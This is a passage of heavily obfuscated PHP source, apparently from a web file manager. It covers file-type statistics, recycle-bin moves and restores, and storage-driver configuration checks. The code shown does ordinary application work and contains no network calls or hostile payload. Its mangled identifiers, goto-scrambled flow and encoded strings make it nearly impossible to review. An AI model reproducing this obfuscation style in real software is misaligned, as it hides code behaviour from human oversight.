$DÈíà¡Èø[508])); $f¸ôÄ¬¡„ = Model($DÈíà¡Èø[415])->field($DÈíà¡Èø[404])->where($C–·¤‘«ˆ¯)->select(); goto D°•î©¼îí; Dœ¼¡—«: $A‘Œ”—Ì = !$A‘Œ”—Ì || $A‘Œ”—Ì <= 0 ? 0 : $A‘Œ”—Ì; return $A‘Œ”—Ì; goto B¶†÷Öñ¢÷; D°•î©¼îí: $f¸ôÄ¬¡„ = array_to_keyvalue($f¸ôÄ¬¡„, $DÈíà¡Èø[33], $DÈíà¡Èø[390]); $f¸ôÄ¬¡„ = array_unique(array_filter($f¸ôÄ¬¡„)); if ($f¸ôÄ¬¡„) { $C–·¤‘«ˆ¯ = array($DÈíà¡Èø[404] => array($DÈíà¡Èø[405], $f¸ôÄ¬¡„)); $A‘Œ”—Ì += floatval($this->where($C–·¤‘«ˆ¯)->sum($DÈíà¡Èø[77])); } goto Dœ¼¡—«; B¶†÷Öñ¢÷: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($DËòÚÆâ) { return $this->fileTypeProfile($DËòÚÆâ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($E¸öÖŞïŸÉ) { return $this->fileTypeProfile($E¸öÖŞïŸÉ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($f’“„èšÑÓ, $C¶Òé…àæ) { goto Aİè¹àÍ—¬; d¥Ùš„½¯: $Dç‡éß¹éç = array(); $Dç‡éß¹éç[$Bö·ïÒæØ[1950]] = array($Bö·ïÒæØ[1951] => LNG($Bö·ïÒæØ[1950]), $Bö·ïÒæØ[1952] => $this->where($b®»¶—ÏÒİ)->count(), $Bö·ïÒæØ[543] => $this->where($b®»¶—ÏÒİ)->sum($Bö·ïÒæØ[77])); $DÃØÊâËÁŒ = KodIO::fileTypeList(); goto c¯áÀÓ‚¸§; c¯áÀÓ‚¸§: foreach ($DÃØÊâËÁŒ as $Cø»–éÜõ› => $c†…ç†¥„ã) { $b®»¶—ÏÒİ[$Bö·ïÒæØ[399]] = $this->fileTypeWhere($Cø»–éÜõ›); $Dç‡éß¹éç[$Cø»–éÜõ›] = array($Bö·ïÒæØ[1951] => $c†…ç†¥„ã[$Bö·ïÒæØ[28]], $Bö·ïÒæØ[1952] => $this->where($b®»¶—ÏÒİ)->count(), $Bö·ïÒæØ[543] => $this->where($b®»¶—ÏÒİ)->sum($Bö·ïÒæØ[77])); } Cache::set($b•ÎÛÖì“ô, $Dç‡éß¹éç, 1200); return $Dç‡éß¹éç; goto aåø Œƒòè; Aİè¹àÍ—¬: $Bö·ïÒæØ =& $_SERVER[ç]; $b•ÎÛÖì“ô = $Bö·ïÒæØ[1949] . $f’“„èšÑÓ . $Bö·ïÒæØ[70] . $C¶Òé…àæ; $F–ˆ…ğ­†Ä = Cache::get($b•ÎÛÖì“ô); goto a¤çïµÅòÂ; a¤çïµÅòÂ: if ($F–ˆ…ğ­†Ä) { return $F–ˆ…ğ­†Ä; } $b®»¶—ÏÒİ = array($Bö·ïÒæØ[541] => 0); if ($f’“„èšÑÓ != !1) { $b®»¶—ÏÒİ[$Bö·ïÒæØ[478]] = $f’“„èšÑÓ; $b®»¶—ÏÒİ[$Bö·ïÒæØ[398]] = $C¶Òé…àæ; } goto d¥Ùš„½¯; aåø Œƒòè: } public function fileNameExist($Cì™½áˆ·œ, $dºôïÖ¶Š‘) { $b”Ù˜õ¡‘° =& $_SERVER[ç]; $E†¹Œà¤à‰ = $this->childList($Cì™½áˆ·œ); foreach ($E†¹Œà¤à‰ as $C–™ò’‡Ù) { if ($C–™ò’‡Ù[$b”Ù˜õ¡‘°[28]] == $dºôïÖ¶Š‘) { return $C–™ò’‡Ù[$b”Ù˜õ¡‘°[390]]; } if (strtolower($C–™ò’‡Ù[$b”Ù˜õ¡‘°[28]]) == strtolower($dºôïÖ¶Š‘)) { return $C–™ò’‡Ù[$b”Ù˜õ¡‘°[390]]; } } return !1; } public function childList($Fì‰·Ã÷ì) { goto a²¢Êí“™¼; B™ÂÁøÖÔ: self::$cacheChildList[$a»™³ì«ÓÊ] = $F×¶ß™Ó‰İ; foreach ($F×¶ß™Ó‰İ as $E¬ã®ì¥…Ë) { $a»™³ì«ÓÊ = $AÜ›²ÇŠ¬´[432] . $E¬ã®ì¥…Ë[$AÜ›²ÇŠ¬´[390]]; self::$cacheSourceInfo[$a»™³ì«ÓÊ] = $E¬ã®ì¥…Ë; } return $F×¶ß™Ó‰İ; goto e¿ª¨Ù—²²; a²¢Êí“™¼: $AÜ›²ÇŠ¬´ =& $_SERVER[ç]; $a»™³ì«ÓÊ = $AÜ›²ÇŠ¬´[1924] . $Fì‰·Ã÷ì; if (isset(self::$cacheChildList[$a»™³ì«ÓÊ])) { return self::$cacheChildList[$a»™³ì«ÓÊ]; } goto Eâ Ğá°ª; Eâ Ğá°ª: $bá’Ö‡‹óÄ = array($AÜ›²ÇŠ¬´[472] => intval($Fì‰·Ã÷ì), $AÜ›²ÇŠ¬´[417] => 0); $F×¶ß™Ó‰İ = $this->where($bá’Ö‡‹óÄ)->select(); $F×¶ß™Ó‰İ = $F×¶ß™Ó‰İ ? $F×¶ß™Ó‰İ : array(); goto B™ÂÁøÖÔ; e¿ª¨Ù—²²: } public function fileNameAuto($cìïÒÃß©½, $fµÅ´É×òÔ, $Cİ‰ÍîÇæ­ = REPEAT_RENAME, $BÏ„ÊÆ˜÷† = false) { $E »º®ÄÍ =& $_SERVER[ç]; $dˆËõ¤Çˆ¸ = $this->childList($cìïÒÃß©½); $DœœùÊ‘§ = array_to_keyvalue($dˆËõ¤Çˆ¸, $E »º®ÄÍ[33], $E »º®ÄÍ[28]); return $this->fileNameAutoGet($DœœùÊ‘§, $fµÅ´É×òÔ, $Cİ‰ÍîÇæ­, $BÏ„ÊÆ˜÷†); } public function fileNameAutoGet($BˆöÄ´È«, $e¤ÃÙ¢‹°â, $Bïì³ĞŒÕš, $FÄá²ÃãŸŒ) { $AÎ¢É¹Â‚¹ =& $_SERVER[ç]; if ($Bïì³ĞŒÕš == REPEAT_REPLACE || !$BˆöÄ´È« || !in_array_not_case($e¤ÃÙ¢‹°â, $BˆöÄ´È«) || $FÄá²ÃãŸŒ && $Bïì³ĞŒÕš != REPEAT_RENAME_FOLDER) { return $e¤ÃÙ¢‹°â; } if ($Bïì³ĞŒÕš == REPEAT_SKIP) { return !1; } $f‡éâÊ·‚ = $AÎ¢É¹Â‚¹[94] . get_path_ext($e¤ÃÙ¢‹°â); $f‡éâÊ·‚ = $f‡éâÊ·‚ == $AÎ¢É¹Â‚¹[94] || $FÄá²ÃãŸŒ ? $AÎ¢É¹Â‚¹[33] : $f‡éâÊ·‚; for ($C¦×İßÆ¾Š = 1; $C¦×İßÆ¾Š <= count($BˆöÄ´È«) + 1; $C¦×İßÆ¾Š++) { $Cóßøì†Œé = substr($e¤ÃÙ¢‹°â, 0, strlen($e¤ÃÙ¢‹°â) - strlen($f‡éâÊ·‚)); $b‡„íÓ´ = $Cóßøì†Œé . "\x28{$C¦×İßÆ¾Š}\51{$f‡éâÊ·‚}"; if (!in_array_not_case($b‡„íÓ´, $BˆöÄ´È«)) { return $b‡„íÓ´; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\143\145\137\x72\145\143\171\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\156\x73\145\x72\164", "\x66\x75\156\x63\164\151\x6f\156")); public function listData($cª’×·¢ïø = false) { $CÖ±Æßõ„ =& $_SERVER[ç]; $cª’×·¢ïø = $cª’×·¢ïø ? $cª’×·¢ïø : USER_ID; $F´¯ïÁæ½î = $this->where(array($CÖ±Æßõ„[1483] => $cª’×·¢ïø))->select(); return array_to_keyvalue($F´¯ïÁæ½î, $CÖ±Æßõ„[33], $CÖ±Æßõ„[390]); } public function moveToRecycle($a²˜œÆ­) { goto E÷‘ë›Ë‹ó; E÷‘ë›Ë‹ó: $B´àÇÜ·ª  =& $_SERVER[ç]; $eÃ´Ö®Ù° = Model($B´àÇÜ·ª [1171]); $eôÆ¤Ï¼× = $eÃ´Ö®Ù°->sourceInfo($a²˜œÆ­); goto cÃ³šâô—ƒ; BÃõíÑ»Óß: $this->recycleMove($a²˜œÆ­, 1); if ($eôÆ¤Ï¼×[$B´àÇÜ·ª [397]] == $B´àÇÜ·ª [86]) { $aš…ß±Äëñ = array($B´àÇÜ·ª [548] => array($B´àÇÜ·ª [507], $eôÆ¤Ï¼×[$B´àÇÜ·ª [481]] . $a²˜œÆ­ . $B´àÇÜ·ª [508])); $eÃ´Ö®Ù°->where($aš…ß±Äëñ)->setField($B´àÇÜ·ª [417], 1); } goto EªøÈ§ñ„Ù; cÃ³šâô—ƒ: if (!$eôÆ¤Ï¼× || $eôÆ¤Ï¼×[$B´àÇÜ·ª [417]] == $B´àÇÜ·ª [86]) { return; } $fà¶ºÍ‡äØ = array($B´àÇÜ·ª [404] => $a²˜œÆ­, $B´àÇÜ·ª [1483] => USER_ID, $B´àÇÜ·ª [544] => $eôÆ¤Ï¼×[$B´àÇÜ·ª [398]], $B´àÇÜ·ª [545] => $eôÆ¤Ï¼×[$B´àÇÜ·ª [478]], $B´àÇÜ·ª [548] => $eôÆ¤Ï¼×[$B´àÇÜ·ª [481]]); $this->add($fà¶ºÍ‡äØ); goto BÃõíÑ»Óß; EªøÈ§ñ„Ù: } public function clear() { $this->remove(!1); } public function remove($b¦ù‡“ç¦Ì = false) { goto c¹ŒÒï‹ö˜; c¹ŒÒï‹ö˜: $dÕ¨¦½Àçí =& $_SERVER[ç]; $F÷››ñ–¬ì = Model($dÕ¨¦½Àçí[1171]); $B‡¯õÈğàÒ = $this->listData(); goto d´‡§š°ÑŒ; d´‡§š°ÑŒ: $b¦ù‡“ç¦Ì = $b¦ù‡“ç¦Ì === !1 ? !1 : $b¦ù‡“ç¦Ì; $aÖ’šŞƒæè = array(); foreach ($B‡¯õÈğàÒ as $C•®½Îß¤) { if ($b¦ù‡“ç¦Ì != !1 && !in_array($C•®½Îß¤, $b¦ù‡“ç¦Ì)) { continue; } $eÊí±ÀŠ½‚ = $F÷››ñ–¬ì->sourceInfo($C•®½Îß¤); $F÷››ñ–¬ì->remove($C•®½Îß¤, !1); $aãğ—ÇŠ÷© = $eÊí±ÀŠ½‚[$dÕ¨¦½Àçí[398]] . $dÕ¨¦½Àçí[70] . $eÊí±ÀŠ½‚[$dÕ¨¦½Àçí[478]]; $aÖ’šŞƒæè[$aãğ—ÇŠ÷©] = array($dÕ¨¦½Àçí[544] => $eÊí±ÀŠ½‚[$dÕ¨¦½Àçí[398]], $dÕ¨¦½Àçí[478] => $eÊí±ÀŠ½‚[$dÕ¨¦½Àçí[478]]); $this->where(array($dÕ¨¦½Àçí[390] => $C•®½Îß¤))->delete(); } goto dÀ¼İÍĞ™î; dÀ¼İÍĞ™î: foreach ($aÖ’šŞƒæè as $cĞ§ø¬••ñ) { $F÷››ñ–¬ì->targetSpaceUpdate($cĞ§ø¬••ñ[$dÕ¨¦½Àçí[398]], $cĞ§ø¬••ñ[$dÕ¨¦½Àçí[478]]); } goto A²Æ ùçª; A²Æ ùçª: } public function restore($A‡‘—„Ç°ì = false) { $B¦¿Æö¢„† = $this->listData(); $this->_restoreSource($B¦¿Æö¢„†, $A‡‘—„Ç°ì); } public function restoreUserAll($aÏÃ·³İ•…) { $eŒ„¨Ù¡œò = $this->listData($aÏÃ·³İ•…); $this->_restoreSource($eŒ„¨Ù¡œò, !1); } private function _restoreSource($f¸¯ŠŒÌ‰·, $CÍãÅã‘ô) { goto a‘§ùŠªá; c»ƒÒ®Ğ¢: if (!$f¸¯ŠŒÌ‰·) { return !0; } $CÃ½ëøÛŸ = array(); foreach ($f¸¯ŠŒÌ‰· as $bê¤—¿–š) { goto B½­Õ¡ƒ­µ; BñÁ‚Åìë÷: if ($aÜ•ñ‹Îí[$F§œ°ìŞèµ[417]] == $F§œ°ìŞèµ[86]) { continue; } $f±¾½÷®©->lockMoveStart($bê¤—¿–š); $this->recycleMove($bê¤—¿–š, 0); goto DÚŞÖöáèÓ; B½­Õ¡ƒ­µ: if ($CÍãÅã‘ô != !1 && !in_array($bê¤—¿–š, $CÍãÅã‘ô)) { continue; } $DÒ»®‰¬Á­ = $f±¾½÷®©->sourceInfo($bê¤—¿–š); $aÜ•ñ‹Îí = $f±¾½÷®©->sourceInfo($DÒ»®‰¬Á­[$F§œ°ìŞèµ[472]]); goto BñÁ‚Åìë÷; DÚŞÖöáèÓ: if ($DÒ»®‰¬Á­[$F§œ°ìŞèµ[397]] == $F§œ°ìŞèµ[86]) { $C……Á¸‘äÎ = array($F§œ°ìŞèµ[548] => array($F§œ°ìŞèµ[507], $DÒ»®‰¬Á­[$F§œ°ìŞèµ[481]] . $bê¤—¿–š . $F§œ°ìŞèµ[508])); $f±¾½÷®©->where($C……Á¸‘äÎ)->setField($F§œ°ìŞèµ[417], 0); $this->restoreFolderChildren($bê¤—¿–š, $f¸¯ŠŒÌ‰·); } $this->where(array($F§œ°ìŞèµ[390] => $bê¤—¿–š))->delete(); $f±¾½÷®©->folderSizeReset($DÒ»®‰¬Á­[$F§œ°ìŞèµ[472]]); goto f“±ßàª‘‰; f“±ßàª‘‰: $CÃ½ëøÛŸ[] = $DÒ»®‰¬Á­[$F§œ°ìŞèµ[472]]; if ($DÒ»®‰¬Á­[$F§œ°ìŞèµ[397]] == $F§œ°ìŞèµ[86]) { $CÃ½ëøÛŸ[] = $bê¤—¿–š; } $f±¾½÷®©->lockMoveEnd($bê¤—¿–š); goto Aî‰„É¶°Ú; Aî‰„É¶°Ú: } goto f²×‰·¯¿; a‘§ùŠªá: $F§œ°ìŞèµ =& $_SERVER[ç]; $f±¾½÷®© = Model($F§œ°ìŞèµ[1171]); $CÍãÅã‘ô = $CÍãÅã‘ô == !1 ? !1 : $CÍãÅã‘ô; goto c»ƒÒ®Ğ¢; f²×‰·¯¿: $f±¾½÷®©->updateModifyTime($CÃ½ëøÛŸ); goto C¥ìëÌ²™; C¥ìëÌ²™: } private function restoreFolderChildren($e–¨¶ÄÌ¿´, $Eñàë³®‘œ) { goto B¨êœˆ­è; fÀ¬«Àß½É: $E’ŠŒİÌù[$c«äÎ¨İÍº[390]][1] = array_unique($E’ŠŒİÌù[$c«äÎ¨İÍº[390]][1]); $E’ŠŒİÌù[$c«äÎ¨İÍº[925]] = $c«äÎ¨İÍº[1742]; $DÊÄ¨œÉ‘->where($E’ŠŒİÌù)->setField($c«äÎ¨İÍº[417], 1); goto F‡åØŠŠ¢; Fˆ¢¸¦šóÉ: foreach ($Eñàë³®‘œ as $Cœ¢–¿À„×) { if ($Cœ¢–¿À„× == $e–¨¶ÄÌ¿´) { continue; } if (!$DÊÄ¨œÉ‘->isParentOf($e–¨¶ÄÌ¿´, $Cœ¢–¿À„×)) { continue; } $Bœšê±•› = $DÊÄ¨œÉ‘->sourceInfo($Cœ¢–¿À„×); if ($Bœšê±•›[$c«äÎ¨İÍº[397]] == $c«äÎ¨İÍº[86]) { $E’ŠŒİÌù[] = array($c«äÎ¨İÍº[548] => array($c«äÎ¨İÍº[507], $Bœšê±•›[$c«äÎ¨İÍº[481]] . $Cœ¢–¿À„× . $c«äÎ¨İÍº[508])); } else { $E’ŠŒİÌù[$c«äÎ¨İÍº[390]][1][] = $Cœ¢–¿À„×; } } if (!$E’ŠŒİÌù[$c«äÎ¨İÍº[390]][1]) { unset($E’ŠŒİÌù[$c«äÎ¨İÍº[390]]); } if (!$E’ŠŒİÌù) { return; } goto fÀ¬«Àß½É; B¨êœˆ­è: $c«äÎ¨İÍº =& $_SERVER[ç]; $DÊÄ¨œÉ‘ = Model($c«äÎ¨İÍº[1171]); $E’ŠŒİÌù = array($c«äÎ¨İÍº[390] => array($c«äÎ¨İÍº[7], array())); goto Fˆ¢¸¦šóÉ; F‡åØŠŠ¢: } private function recycleMove($E— ÔÁàŞá, $EíÔšÓ±Ø¦ = 1) { $cŞ¶¨™ã´Æ =& $_SERVER[ç]; $D½Õ¹ˆ‹ˆù = Model($cŞ¶¨™ã´Æ[1171]); $aå›ÔÓÕÜ = Model($cŞ¶¨™ã´Æ[1953]); $a›±ì—Ù’® = array($cŞ¶¨™ã´Æ[390] => $E— ÔÁàŞá); if ($EíÔšÓ±Ø¦) { $D½Õ¹ˆ‹ˆù->where($a›±ì—Ù’®)->setField($cŞ¶¨™ã´Æ[417], 1); $aå›ÔÓÕÜ->eventRecycle($E— ÔÁàŞá, $cŞ¶¨™ã´Æ[1954]); } else { $EÅ°ªœ¼½ = $D½Õ¹ˆ‹ˆù->where($a›±ì—Ù’®)->find(); $b¾‚É°Ó = $EÅ°ªœ¼½[$cŞ¶¨™ã´Æ[397]] == $cŞ¶¨™ã´Æ[86]; $D³²ë›Éã = $D½Õ¹ˆ‹ˆù->fileNameAuto($EÅ°ªœ¼½[$cŞ¶¨™ã´Æ[472]], $EÅ°ªœ¼½[$cŞ¶¨™ã´Æ[28]], REPEAT_RENAME_FOLDER, $b¾‚É°Ó); if ($D³²ë›Éã != $EÅ°ªœ¼½[$cŞ¶¨™ã´Æ[28]]) { $D½Õ¹ˆ‹ˆù->rename($E— ÔÁàŞá, $D³²ë›Éã); } $D½Õ¹ˆ‹ˆù->where($a›±ì—Ù’®)->setField($cŞ¶¨™ã´Æ[417], 0); $aå›ÔÓÕÜ->eventRecycle($E— ÔÁàŞá, $cŞ¶¨™ã´Æ[1955]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x73\x74\157\x72\141\x67\x65\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\151\172\x65\115\x61\170", "\163\171\x73\164\x65\x6d", "\x64\145\x66\141\165\154\x74", "\x64\162\x69\166\x65\x72", "\x63\x6f\156\146\151\x67"); public function listData($dÆ¦ó‹å›à = false, $d”ˆî“‹ôš = "\155\157\144\x69\x66\x79\124\x69\155\x65", $d§»ÎŠ‡  = false) { $f†¼Éà áó =& $_SERVER[ç]; $D¥ééÍùºŸ = parent::listData($dÆ¦ó‹å›à, $d”ˆî“‹ôš, $d§»ÎŠ‡ ); if ($dÆ¦ó‹å›à) { return $D¥ééÍùºŸ; } $dÕ„ïÕó¢İ = $this->ioSizeUseGet(array_to_keyvalue($D¥ééÍùºŸ, $f†¼Éà áó[33], $f†¼Éà áó[388])); foreach ($D¥ééÍùºŸ as $DÉˆïİâÑÛ => $e½ÙÖÉ‘Òİ) { unset($D¥ééÍùºŸ[$DÉˆïİâÑÛ][$f†¼Éà áó[6]]); $D¥ééÍùºŸ[$DÉˆïİâÑÛ][$f†¼Éà áó[1640]] = isset($dÕ„ïÕó¢İ[$e½ÙÖÉ‘Òİ[$f†¼Éà áó[388]]]) ? $dÕ„ïÕó¢İ[$e½ÙÖÉ‘Òİ[$f†¼Éà áó[388]]] : 0; } return $D¥ééÍùºŸ; } public function ioSizeUseGet($a…‹¨ùö³Ó) { goto CáÂ‰­˜‹; EÔäÀ¼éõĞ: $A´³›ĞÉí = Cache::get($bšº¥÷Â·); if ($A´³›ĞÉí) { return $A´³›ĞÉí; } $FêøÙïÚîì = array($a¢äŒ øÆ½[753] => $a¢äŒ øÆ½[388], $a¢äŒ øÆ½[1957] => $a¢äŒ øÆ½[77]); goto E›µ²¸ÎŸº; aˆä”Æ¡Ï˜: Cache::set($bšº¥÷Â·, $A´³›ĞÉí, 60); return $A´³›ĞÉí; goto a„÷˜Šåø‘; CáÂ‰­˜‹: $a¢äŒ øÆ½ =& $_SERVER[ç]; if (!$a…‹¨ùö³Ó) { return array(); } $bšº¥÷Â· = $a¢äŒ øÆ½[1956] . implode($a¢äŒ øÆ½[47], $a…‹¨ùö³Ó); goto EÔäÀ¼éõĞ; E›µ²¸ÎŸº: $A·ƒ¡±ÈÌÖ = array($a¢äŒ øÆ½[753] => array($a¢äŒ øÆ½[7], $a…‹¨ùö³Ó)); $A´³›ĞÉí = Model($a¢äŒ øÆ½[724])->field($FêøÙïÚîì)->where($A·ƒ¡±ÈÌÖ)->group($a¢äŒ øÆ½[753])->select(); $A´³›ĞÉí = array_to_keyvalue($A´³›ĞÉí, $a¢äŒ øÆ½[388], $a¢äŒ øÆ½[77]); goto aˆä”Æ¡Ï˜; a„÷˜Šåø‘: } public function getConfig($FÑŠ‘î¬Ÿ) { $D¼ÕÊŒ´¥Œ = parent::listData($FÑŠ‘î¬Ÿ); return json_decode($D¼ÕÊŒ´¥Œ[$_SERVER[ç][6]], !0); } public function update($Bƒ÷¦ËÕ‹, $aäÀÍÒ‚ ã) { goto E±éœ«İ; aÌäê‰„¦: $cõÊ‘‰Œ = parent::update($Bƒ÷¦ËÕ‹, $aäÀÍÒ‚ ã); if ($cõÊ‘‰Œ && $aäÀÍÒ‚ ã[$FÌâœÜÃğ[34]]) { foreach ($Bñµ¸£Ø®¨ as $bØ™ÒšÎí—) { if ($bØ™ÒšÎí—[$FÌâœÜÃğ[34]] && $bØ™ÒšÎí—[$FÌâœÜÃğ[388]] != $Bƒ÷¦ËÕ‹) { parent::update($bØ™ÒšÎí—[$FÌâœÜÃğ[388]], array($FÌâœÜÃğ[34] => 0)); } } } return $cõÊ‘‰Œ; goto BµµÊ©ÊÓ¿; d†ÏÆ¨õØ: if (isset($Bñµ¸£Ø®¨[$e¹Ã«Ã¯ùÔ]) && $Bñµ¸£Ø®¨[$e¹Ã«Ã¯ùÔ][$FÌâœÜÃğ[388]] != $Bƒ÷¦ËÕ‹) { return !1; } if (isset($aäÀÍÒ‚ ã[$FÌâœÜÃğ[1958]]) && $aäÀÍÒ‚ ã[$FÌâœÜÃğ[1958]] == $FÌâœÜÃğ[86]) { $this->checkConfig($aäÀÍÒ‚ ã); } unset($aäÀÍÒ‚ ã[$FÌâœÜÃğ[1958]]); goto aÌäê‰„¦; E±éœ«İ: $FÌâœÜÃğ =& $_SERVER[ç]; $e¹Ã«Ã¯ùÔ = $aäÀÍÒ‚ ã[$FÌâœÜÃğ[28]]; $Bñµ¸£Ø®¨ = array_to_keyvalue(parent::listData(), $FÌâœÜÃğ[28]); goto d†ÏÆ¨õØ; BµµÊ©ÊÓ¿: } public function add($fÈ†Ä—¶İõ) { goto F³Û…Òâ¨’; eŠ°ƒ”¶ÇÕ: $this->checkConfig($fÈ†Ä—¶İõ); $d¸å‡Éî¡É = parent::insert($fÈ†Ä—¶İõ); if ($d¸å‡Éî¡É && $fÈ†Ä—¶İõ[$dÔâ¯¹±¤‹[34]]) { foreach ($FŞŒ„™ôéö as $E‘š³ö÷¢…) { if ($E‘š³ö÷¢…[$dÔâ¯¹±¤‹[34]]) { parent::update($E‘š³ö÷¢…[$dÔâ¯¹±¤‹[388]], array($dÔâ¯¹±¤‹[34] => 0)); } } } goto eÄĞ•™‚’Ò; F³Û…Òâ¨’: $dÔâ¯¹±¤‹ =& $_SERVER[ç]; $FŞŒ„™ôéö = array_to_keyvalue(parent::listData(), $dÔâ¯¹±¤‹[28]); if (isset($FŞŒ„™ôéö[$fÈ†Ä—¶İõ[$dÔâ¯¹±¤‹[28]]])) { return !1; } goto eŠ°ƒ”¶ÇÕ; eÄĞ•™‚’Ò: return $d¸å‡Éî¡É; goto BåìÛŠ¡êô; BåìÛŠ¡êô: } public function checkConfig(&$D÷¡ôÌœƒÕ) { goto fˆÁ†”·¿ã; fˆÁ†”·¿ã: $CğÇø¥ìä¡ =& $_SERVER[ç]; $B»Šº¢»Î = strtolower($D÷¡ôÌœƒÕ[$CğÇø¥ìä¡[93]]); $bùæÛ¢Ôƒá = json_decode($D÷¡ôÌœƒÕ[$CğÇø¥ìä¡[6]], !0); goto A„ñŠ•¯‹; f®Ú®‹Ñœ‰: $D÷¡ôÌœƒÕ[$CğÇø¥ìä¡[6]] = json_encode($bùæÛ¢Ôƒá); $D÷¡ôÌœƒÕ[$CğÇø¥ìä¡[93]] = $C Ï„“¥‡š; return !0; goto aøáá°«¿¦; AïËŠšÌ˜Í: $C Ï„“¥‡š = isset($EøÊá× ù[$B»Šº¢»Î]) ? $EøÊá× ù[$B»Šº¢»Î] : ucfirst($B»Šº¢»Î); $f°öëÜ Æê = $CğÇø¥ìä¡[71] . $C Ï„“¥‡š; if (!$C Ï„“¥‡š || !class_exists($f°öëÜ Æê)) { write_log(array($CğÇø¥ìä¡[1960], $D÷¡ôÌœƒÕ, get_caller_info()), $CğÇø¥ìä¡[1961]); show_json(LNG($CğÇø¥ìä¡[1962]), !1, $D÷¡ôÌœƒÕ); } goto B‚ëÊÕ§‡–; B‚ëÊÕ§‡–: $B’Ç•ˆÙô = new $f°öëÜ Æê($bùæÛ¢Ôƒá); if (in_array($B»Šº¢»Î, $B’Ç•ˆÙô->objectDriver)) { if (!$B’Ç•ˆÙô->isBucketCors() && !$B’Ç•ˆÙô->setBucketCors()) { $D­ù´¤¹§˜ = LNG($CğÇø¥ìä¡[1963]); $D­ù´¤¹§˜ .= $CğÇø¥ìä¡[1964] . LNG($CğÇø¥ìä¡[1965]); show_json($D­ù´¤¹§˜, !1); } } $aÇå„Ş¹ÚÓ = rtrim($bùæÛ¢Ôƒá[$CğÇø¥ìä¡[1043]], $CğÇø¥ìä¡[8]) . $CğÇø¥ìä¡[8]; goto BĞíåøÍ¼Ù; BĞíåøÍ¼Ù: $aÕ­ªëê³ = $B’Ç•ˆÙô->getPath($aÇå„Ş¹ÚÓ . $CğÇø¥ìä¡[1104]); if (!$B’Ç•ˆÙô->mkfile($aÕ­ªëê³)) { show_json(LNG($CğÇø¥ìä¡[1963]), !1); } $bùæÛ¢Ôƒá[$CğÇø¥ìä¡[1043]] = $aÇå„Ş¹ÚÓ; goto f®Ú®‹Ñœ‰; A„ñŠ•¯‹: foreach ($bùæÛ¢Ôƒá as $FØÈ±…¶¸ => $DÔ¥ÔÚ£) { $bùæÛ¢Ôƒá[$FØÈ±…¶¸] = trim($DÔ¥ÔÚ£); } $bùæÛ¢Ôƒá[$CğÇø¥ìä¡[1959]] = rand_string(6); $EøÊá× ù = $GLOBALS[$CğÇø¥ìä¡[6]][$CğÇø¥ìä¡[87]][$CğÇø¥ìä¡[761]]; goto AïËŠšÌ˜Í; aøáá°«¿¦: } public function driverListSystem() { $F§Ë¢áá¥ =& $_SERVER[ç]; $f™ŸöíÑ¾İ = parent::listData(); $Bêİ‡»ÖŒ = array(); foreach ($f™ŸöíÑ¾İ as $dõ¶·¢ã˜) { unset($dõ¶·¢ã˜[$F§Ë¢áá¥[192]], $dõ¶·¢ã˜[$F§Ë¢áá¥[83]]); $dõ¶·¢ã˜[$F§Ë¢áá¥[6]] = json_decode($dõ¶·¢ã˜[$F§Ë¢áá¥[6]], !0); $Bêİ‡»ÖŒ[] = $dõ¶·¢ã˜; } return $Bêİ‡»ÖŒ; } public function defaultDriver() { $AŠ‰ïéâœ¬ =& $_SERVER[ç]; $cçÏ‰ê¢¾ = parent::listData(); $FòñˆÉ¿éé = array_filter_by_field($cçÏ‰ê¢¾, $AŠ‰ïéâœ¬[34], 1); $FòñˆÉ¿éé = $FòñˆÉ¿éé[0]; if ($FòñˆÉ¿éé) { $FòñˆÉ¿éé[$AŠ‰ïéâœ¬[6]] = json_decode($FòñˆÉ¿éé[$AŠ‰ïéâœ¬[6]], !0); } return $FòñˆÉ¿éé; } public function driverInfo($aª¡ã®¯³­) { $b¿—›õÀ…º =& $_SERVER[ç]; $CÔƒõÖ›î¾ = array_to_keyvalue(parent::listData(), $b¿—›õÀ…º[388]); if (!isset($CÔƒõÖ›î¾[$aª¡ã®¯³­])) { return !1; } $F‘µŞÖ†®Ÿ = $CÔƒõÖ›î¾[$aª¡ã®¯³­]; $F‘µŞÖ†®Ÿ[$b¿—›õÀ…º[6]] = json_decode($F‘µŞÖ†®Ÿ[$b¿—›õÀ…º[6]], !0); return $F‘µŞÖ†®Ÿ; } public function remove($B²Ğ¡ïôç´) { $this->removeShareItems($B²Ğ¡ïôç´); return parent::remove($B²Ğ¡ïôç´); } public function removeWithFile($A‰ï­õÕÓÆ, $eŒÇë†‰“Í) { goto E íƒó––í; D×ÁĞ·Šöœ: $F‡©Ÿ”áœ = Model($AŒ˜ƒ²À¹‰[444])->where($d·ï¸£óõ )->sum($AŒ˜ƒ²À¹‰[77]); $dÕÎ¹Š–Ù = $eŒÇë†‰“Í . $AŒ˜ƒ²À¹‰[1966] . $A‰ï­õÕÓÆ; $F¦ÇÜÏ‰¼Û = new TaskFileTransfer($dÕÎ¹Š–Ù, $AŒ˜ƒ²À¹‰[1961], $B‹„Œœ›¤Ã, LNG($AŒ˜ƒ²À¹‰[1967]) . "\x28{$A‰ï­õÕÓÆ}\51"); goto Fğ©ê»±; Fğ©ê»±: $F¦ÇÜÏ‰¼Û->task[$AŒ˜ƒ²À¹‰[704]] = (double) $F‡©Ÿ”áœ; $c´ÑÅ‰—½ = KodIO::defaultDriver(); $Aêò¾‰¦ÇË = $c´ÑÅ‰—½[$AŒ˜ƒ²À¹‰[388]]; goto eœ®†´¿å¦; fµ§¯‘²Û³: $d¾ÉŠËÌàÒ = Model($AŒ˜ƒ²À¹‰[173])->where($d·ï¸£óõ )->field($AŒ˜ƒ²À¹‰[1968])->select(); foreach ($d¾ÉŠËÌàÒ as $fğÉ¢¶°Œ) { goto b«Ê»ñ—Ğ½; F¨ê³ÇãË: if (IO::exist($C½Í¯Ì„Ê‚)) { $F¦ÇÜÏ‰¼Û->updateFileEnd($fğÉ¢¶°Œ[$AŒ˜ƒ²À¹‰[28]], $fğÉ¢¶°Œ[$AŒ˜ƒ²À¹‰[77]]); continue; } if (!IO::move($e½Äëâª…ã, 